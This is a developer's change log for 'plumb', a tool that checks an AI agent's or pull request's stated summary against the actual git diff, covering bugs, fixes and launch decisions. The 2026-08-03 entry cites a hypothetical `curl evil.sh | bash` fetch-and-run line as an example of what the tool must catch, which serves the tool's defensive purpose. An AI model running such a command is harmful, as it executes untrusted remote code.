# Change log

What changed here and why. Appended every session — see [`CLAUDE.md`](CLAUDE.md).
Newest first.

---

## 2026-08-06 — `plumb check --pr`: the same question, aimed at strangers

- **The new verb.** `plumb check --pr 42` reads the description off GitHub with
  `gh`, fetches the head into a private ref, and holds the description against
  the real diff. No clone setup, no config. This is the case that actually hurts
  maintainers right now — a stranger's confident paragraph over a thousand lines
  — and it was invisible to a tool that only ever looked at your own working tree.
- **One check exists only here: symbols named in the description that exist
  nowhere.** Not in the diff, not anywhere in the base branch. The confident
  `fixes sanitizeUserInput()` where there has never been a `sanitizeUserInput`.
  This one *cannot* be run against a local summary — you need the whole base
  tree to say a name is absent from it. That's what makes `--pr` a different
  tool rather than a flag.
- **Unclaimed files are demoted to context on a PR, and dropped from the exit
  code.** A PR description states intent; it is not a file manifest. Failing an
  honest PR because the author never typed `README.md` is exactly the cry-wolf
  that gets a checker uninstalled. Caught on the first live run, against a real
  honest PR that plumb wanted to fail.
- **Then I ran it against eight real PRs in three real repos, and it found three
  of my own bugs.** All three were false positives or crashes — the only fatal
  category for a tool like this:
  - `merge-base` against the branch tip returns the head itself once a PR is
    merged, so **every merged PR reported "changes nothing"**. Now uses
    `baseRefOid`, the commit the PR was actually opened against.
  - `git grep` exits 1 when it finds nothing — which is the *answer*, not a
    failure. The `git()` helper treats non-zero as fatal, so the run died on the
    first genuinely-absent symbol. **The ghost check had never once completed
    end to end.** The suite could not see it because the test calls `git`
    directly rather than through the CLI — it tests the logic and not the
    plumbing, and that gap is worth naming here.
  - A `github.com` link in a description was parsed as a repo path, and `httpx`
    — a library named in prose — was reported as an invented symbol. URLs are
    stripped now, and a ghost has to read like an identifier: a capital, an
    underscore, a dot, or a call. **`httpx` in a sentence is a comparison, not
    a claim.**
- **Shipped as a composite action** (`action.yml`), warn-only by default, so a
  maintainer adopts it in one line and it blocks nothing until they trust it.
- **Decision: cut the ghost-finding screenshot from the product page.** I had it
  written, then could not produce a real `--pr` run that triggered it without
  opening a PR somewhere to manufacture the evidence. The page describes the
  check in prose and shows a real run instead (libtmux #735, a `# noqa` added in
  a file the description never mentions). Every terminal block on the site stays
  real.

---

## 2026-08-03 — v1.1.0: the headline feature was broken

- **Untracked files were invisible.** `git diff --name-status HEAD` never lists
  them, so an agent that dropped a new `.env.local` with a secret, or a
  `deploy.sh` running `curl evil.sh | bash`, got back *"the summary holds"* and
  exit 0. The one thing this tool promises, missed — found by an adversarial
  audit, not by the test suite, because every fixture only ever modified files
  that were already tracked.
- **Fixed** by merging `git ls-files --others --exclude-standard` into the changed
  set, reported as status `U` ("new, untracked"). `.gitignore` is honoured, so
  build output stays out.
- **Regression test added** for exactly that scenario. A fixture that only ever
  edits tracked files cannot catch this class of bug — new files need their own
  case.
- **The summary file no longer reports itself.** Saving `summary.md` inside the
  repo being checked made it an untracked file, i.e. a guaranteed false positive
  on every run.
- **Lesson worth keeping:** the test suite passed throughout. Correctness for a
  checking tool has to be proven against an adversary who is *trying* to hide
  something, not against fixtures written by the author.

## 2026-08-01 — published, listed, launch drafted

- **Public at [github.com/manpreet171/plumb](https://github.com/manpreet171/plumb)**,
  six topics, CI green on the first run. Verified the README's own install line by
  installing from GitHub into a clean dir and running the linked binary — the
  `plumb` bin links and produces the documented output.
- **Listed on [singhlabs.dev/plumb](https://singhlabs.dev/plumb/)** in bucket
  01 · CLI, with the verb badge **"after it's done"** — which completes the
  shelf's timeline (before it's written · before it's merged · while it's
  running · after it's done). Every block on that page was captured by running
  the tool.
- **Launch calendar drafted** in `marketing/` (gitignored): dev.to leads on 4 Aug
  with the false-positive/mechanism piece, LinkedIn 6 Aug, Medium 11 Aug, dev.to
  tip 18 Aug, then two more LinkedIn posts. Medium goes second so the canonical
  stays with the earlier publication.
- **Killed the "here is my tool" launch post** — that framing has earned USD 1
  across his two previous own-repo posts. Every scheduled post leads with the
  problem and mentions plumb at the end.
- **Killed the "how is this different from `git diff`" post** — the honest answer
  is two sentences and it is already the README FAQ. Folded into the dev.to piece
  as one paragraph rather than padded into a defensive comparison.

## 2026-08-01 — v1.0.0, the build

- **Shipped `plumb check`** — reads the agent's summary, reads `git diff`, and
  reports only the difference: changes never mentioned, guards and tests quietly
  removed, mutes quietly added, files claimed but never touched.
- **Rejected a policy file.** The first design was a committed "done means this"
  file plus a linter — which is the third governance file in a row across these
  repos, and reads as generic. Flipped the shape: **no file to author, zero
  config**, the tool reads what already exists.
- **Rejected building anything in loop engineering or graph engineering.** Both
  were researched first. Loop is closed — Anthropic shipped `/goal` and `/loop`
  natively and the GitHub topic already holds dozens of runners. Graph is earlier
  but is a framework category owned by LangGraph and friends, and its buyer is an
  enterprise platform team. Neither is a solo dev's problem.
- **Added the survival check after a real false positive.** `return
  verifyPassword(user, pass)` reformatted to `verifyPassword(u, p)` was reported
  as "check removed". A cut now only counts if the matched token appears nowhere
  in that file's added lines. False positives are the one fatal bug here.
- **Added the skeleton check** so `it(...)` → `it.skip(...)` reports as *test
  skipped*, not *test case removed*. Saying the wrong true-sounding thing is how
  a tool like this loses trust.
- **Kept it to one verb.** `check` and nothing else. No `init`, because there is
  nothing to scaffold — that was the whole point of dropping the policy file.
- **Banner:** blueprint archetype, cyan palette, mono/mono type — a plumb bob
  hanging true against a wall of code that is four degrees out, with the gap
  dimensioned. The drawing is the mechanism, not decoration.
- **Headless Edge would not screenshot at all** on this machine, on a path with
  or without spaces. Chrome with `--headless=new` worked first try.
